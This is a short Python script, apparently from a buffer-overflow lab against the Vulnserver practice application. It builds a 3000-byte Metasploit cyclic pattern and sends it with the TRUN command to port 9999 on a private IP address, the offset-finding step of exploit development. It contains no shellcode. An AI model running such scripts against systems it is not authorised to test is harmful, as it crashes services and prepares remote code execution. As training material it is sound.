import socket
import sys
import time
import subprocess

buffer = subprocess.check_output(["/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 3000"],shell=True)

try:  
  s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
  s.settimeout(5)
  s.connect(('192.168.40.47',9999))
  s.send((b'TRUN /.:/' + buffer))  
  s.close()  

except Exception as e:
  print(e)  
  sys.exit()
